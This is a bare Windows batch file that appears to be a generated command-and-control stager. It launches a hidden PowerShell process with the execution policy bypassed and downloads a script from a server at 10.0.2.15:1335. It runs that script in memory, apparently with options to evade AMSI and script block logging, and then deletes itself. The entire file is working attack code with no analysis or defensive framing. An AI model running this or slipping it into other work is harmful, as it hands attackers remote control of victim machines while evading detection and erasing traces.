@echo off
start /b powershell.exe -nol -w 1 -nop -ep bypass "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.0.2.15:1335/download/powershell/OmV0dyBTY3JpcHRCbG9ja0xvZ0J5cGFzcyBSYXN0YU1vdXNlIExpYmVybWFuIG1hdHRpZmVzdGF0aW9uIGlyb25weXRob25fYW1zaQ==') -UseBasicParsing|iex"
(goto) 2>nul & del "%~f0"
